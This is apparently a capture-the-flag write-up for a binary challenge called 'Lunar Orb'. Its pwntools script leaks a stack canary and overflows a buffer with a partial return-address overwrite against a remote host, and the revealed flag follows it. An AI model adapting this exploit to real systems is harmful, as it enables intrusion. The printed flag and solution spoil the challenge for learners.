# Lunar Orb

## Approach

`\x00` will cut off the string, so we need to skip the first byte while leaking the canary, therefore the length of padding is `0x59`.

```python
from pwn import *

p = remote("94.237.53.203", 58633)

p.recvuntil("\n\n> ")

"""
[buf..... ........  ........ ........
    ........ ........  ........ ........]
[v3______ ________  ________ ________
    ________ ________  ________ ________
    ________ ________  ________ ________
    ________ ________  __Q u a  r k · Q
    u a r k  · \n____  ________ ________
    ________ ________][00xxxxxx xxxxxxxx]  <-- canary
[old_rbp. ........][ret_addr ........]
"""

payload = b"A" * 0x59 + b"Quack Quack "  # read(0, buf, 0x66uLL);
p.sendline(payload)

resp = p.recvuntil("\n\n> ")
leaked = resp.split(b"Quack Quack ")[1].split(b", ready to fight")[0]
print("leaked:", leaked.hex())

canary = b"\00" + leaked[:7]
old_rbp = p64(0)
payload = b"A" * 0x58 + canary + old_rbp + b"\x7f\x13"  # read(0, v3, 0x6Aull);
p.sendline(payload)

print(p.recv())

# HTB{~c4n4ry_g035_qu4ck_qu4ck~_c4a84b060d972046d5c28b5a704c9185}
```
